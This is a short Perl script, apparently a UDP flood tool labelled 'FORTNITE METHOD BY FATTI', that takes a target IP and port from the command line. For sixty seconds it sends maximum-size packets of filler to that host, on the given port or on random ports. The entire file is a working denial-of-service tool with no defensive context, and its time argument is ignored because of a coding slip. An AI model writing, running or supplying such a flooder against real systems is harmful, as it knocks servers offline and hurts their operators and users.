use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Usage: perl fn.pl <Target> <PORT>\n";
$endtime = time() + ($endtime ? $endtime : 60);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Target:$ip TIME:60 \n";
print "FORTNITE METHOD BY FATTI\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : 65500;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/69x/98x/45x"), 0, pack_sockaddr_in($pport, $iaddr));}